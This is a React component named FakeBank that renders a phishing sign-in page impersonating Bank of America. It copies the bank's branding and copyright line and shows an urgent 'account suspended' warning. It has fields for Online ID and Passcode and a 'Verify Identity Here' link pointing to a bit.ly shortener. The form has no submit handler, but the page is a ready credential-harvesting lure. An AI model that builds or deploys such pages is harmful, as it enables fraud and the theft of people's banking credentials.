
import React from 'react';

export default function FakeBank() {
  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center font-sans">
      <div className="bg-white p-8 rounded shadow-md w-full max-w-md">
        <div className="mb-6 text-center">
          <h1 className="text-2xl font-bold text-red-600">Bank of America</h1>
          <p className="text-gray-600 text-sm">Secure Sign-In</p>
        </div>
        
        <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
          <div className="flex">
            <div className="ml-3">
              <p className="text-sm text-yellow-700">
                URGENT: Your account has been temporarily suspended due to suspicious activity. Please verify your identity immediately to restore access.
              </p>
            </div>
          </div>
        </div>

        <form className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700">Online ID</label>
            <input type="text" className="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2" placeholder="Enter your ID" />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700">Passcode</label>
            <input type="password" className="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2" placeholder="Enter your passcode" />
          </div>
          <div className="flex items-center justify-between">
            <div className="text-sm">
              <a href="#" className="font-medium text-blue-600 hover:text-blue-500">Forgot ID/Passcode?</a>
            </div>
          </div>
          <div>
            <button type="submit" className="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
              Sign In to Bank of America
            </button>
          </div>
        </form>
        
        <div className="mt-6 text-center text-xs text-gray-500">
          <p>&copy; 2024 Bank of America Corporation. All rights reserved.</p>
          <a href="http://bit.ly/secure-verify-boa" className="text-blue-500 hover:underline">Verify Identity Here</a>
        </div>
      </div>
    </div>
  );
}
